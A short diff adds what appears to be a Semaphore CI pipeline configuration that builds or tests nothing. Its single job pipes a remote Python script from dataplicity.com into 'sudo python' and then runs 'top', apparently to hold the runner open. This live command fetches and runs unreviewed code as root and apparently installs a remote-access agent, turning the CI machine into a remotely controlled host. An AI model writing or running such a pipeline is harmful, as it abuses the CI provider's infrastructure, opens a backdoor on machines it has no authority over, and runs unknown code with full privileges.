@@ -1,0 +1,14 @@
+version: v1.0
+name: Parallel
+agent:
+  machine:
+    type: e1-standard-2
+    os_image: ubuntu1804
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'curl -s https://www.dataplicity.com/m0qmver2.py | sudo python'
+            - top
